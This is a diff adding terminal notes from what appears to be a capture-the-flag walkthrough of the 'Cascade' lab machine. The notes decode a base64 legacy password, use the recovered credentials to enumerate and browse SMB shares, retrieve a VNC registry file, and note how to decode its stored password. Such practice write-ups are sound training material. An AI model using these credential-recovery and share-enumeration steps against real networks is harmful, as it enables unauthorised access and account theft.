@@ -116,3 +116,111 @@ cascadeLegacyPwd: clk0bjVldmE=
 .
 .
 .
+allenwest1@debian:~/Desktop$ echo "clk0bjVldmE=" | base64 -d                                                                                        
+rY4n5eva
+.
+.
+.
+// r.thompson:rY4n5eva
+.
+.
+.
+allenwest1@debian:~/Desktop$ ssh r.thompson@10.10.10.182
+^C
+.
+.
+.
+// No port 22 dipshit
+.
+.
+.
+allenwest1@debian:~/Desktop$ smbclient -L 10.10.10.182 -U r.thompson
+mkdir failed on directory /var/run/samba/msg.lock: Permission denied
+Unable to initialize messaging context
+Enter WORKGROUP\r.thompson's password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        Audit$          Disk      
+        C$              Disk      Default share
+        Data            Disk      
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        print$          Disk      Printer Drivers
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.182 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available
+allenwest1@debian:~/Desktop$ smbclient //10.10.10.182/Data -U r.thompson
+mkdir failed on directory /var/run/samba/msg.lock: Permission denied
+Unable to initialize messaging context
+Enter WORKGROUP\r.thompson's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls -al
+NT_STATUS_NO_SUCH_FILE listing \-al
+smb: \> ls 
+  .                                   D        0  Sun Jan 26 22:27:34 2020
+  ..                                  D        0  Sun Jan 26 22:27:34 2020
+  Contractors                         D        0  Sun Jan 12 20:45:11 2020
+  Finance                             D        0  Sun Jan 12 20:45:06 2020
+  IT                                  D        0  Tue Jan 28 13:04:51 2020
+  Production                          D        0  Sun Jan 12 20:45:18 2020
+  Temps                               D        0  Sun Jan 12 20:45:15 2020
+
+                13106687 blocks of size 4096. 7794752 blocks available
+smb: \> cd Temps
+smb: \Temps\> ls
+NT_STATUS_ACCESS_DENIED listing \Temps\*
+smb: \Temps\> cd ..
+smb: \> cd Production
+smb: \Production\> ls
+NT_STATUS_ACCESS_DENIED listing \Production\*
+smb: \Production\> cd ..
+smb: \> cd IT
+smb: \IT\> ls
+  .                                   D        0  Tue Jan 28 13:04:51 2020
+  ..                                  D        0  Tue Jan 28 13:04:51 2020
+  Email Archives                      D        0  Tue Jan 28 13:00:30 2020
+  LogonAudit                          D        0  Tue Jan 28 13:04:40 2020
+  Logs                                D        0  Tue Jan 28 19:53:04 2020
+  Temp                                D        0  Tue Jan 28 17:06:59 2020
+
+                13106687 blocks of size 4096. 7794751 blocks available
+smb: \IT\> cd Temp\
+smb: \IT\Temp\> ls
+  .                                   D        0  Tue Jan 28 17:06:59 2020
+  ..                                  D        0  Tue Jan 28 17:06:59 2020
+  r.thompson                          D        0  Tue Jan 28 17:06:53 2020
+  s.smith                             D        0  Tue Jan 28 15:00:01 2020
+
+                13106687 blocks of size 4096. 7794743 blocks available
+.
+.
+.
+// s.smith:
+.
+.
+.
+smb: \IT\Temp\> cd s.smith
+smb: \IT\Temp\s.smith\> ls
+  .                                   D        0  Tue Jan 28 15:00:01 2020
+  ..                                  D        0  Tue Jan 28 15:00:01 2020
+  VNC Install.reg                     A     2680  Tue Jan 28 14:27:44 2020
+
+                13106687 blocks of size 4096. 7794487 blocks available
+smb: \IT\Temp\s.smith\> get "VNC Install.reg"
+getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (30.8 KiloBytes/sec) (average 30.8 KiloBytes/sec)
+.
+.
+.
+// Contents will be in VNC-Install.reg
+// Contained line:
+// "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+// Decode to Base64 @ https://base64.guru/converter/encode/hex
+// Decoded to: a88qS25ayg8=
+// Further decoded using vncpwd in  terminal2.bash
+.
+.
+.
+// 
